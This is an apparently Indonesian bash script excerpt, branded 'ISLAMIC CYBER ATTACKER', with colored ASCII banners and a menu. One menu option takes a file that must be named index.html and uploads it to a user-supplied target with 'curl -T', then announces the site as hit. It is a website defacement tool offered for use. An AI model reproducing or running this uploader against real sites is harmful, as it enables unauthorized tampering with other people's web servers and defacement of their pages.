...
echo
echo
toilet -f future "    @ahmed_78988" | lolcat
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo $yellow
figlet -f future "ISLAMIC CYBER ATTACKER"
echo
echo $red"##########################$green" WELCOME "$red###########################"
echo
...
echo $indigo"=============================================================="
echo
echo $white "╭─"$yellow"Mr.XaHmd022"$cyan" ~ICA"$white
read -p " ╰─$ "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
...
echo $green "╭─"$blue"Mr.Xahmd022"$cyan" ~/Nama SC Harus(index.html) GOBLOK!1!1!1"$white
read -p " ╰─$ "  script
curl -T /storage/emulated/0/$script $target
echo $red "["$yellow"TerEntoD"$red"]"$cyan"～～～＞"$green" $target"
echo
...
echo
echo "Masukan Script !!!!"
echo $white "╭─"$green"Mr.XaHmd022"$cyan" -ICA"$white                               
read -p " ╰─$ " script
echo
echo
...
if [ $apaan = "Q" ] || [ $apaan = "q" ]
then
echo " Terimakasih Sudah Menggunakan Tools Kami.. Follow Ig saya @ahmed_78988:) "
exit
clear
fi
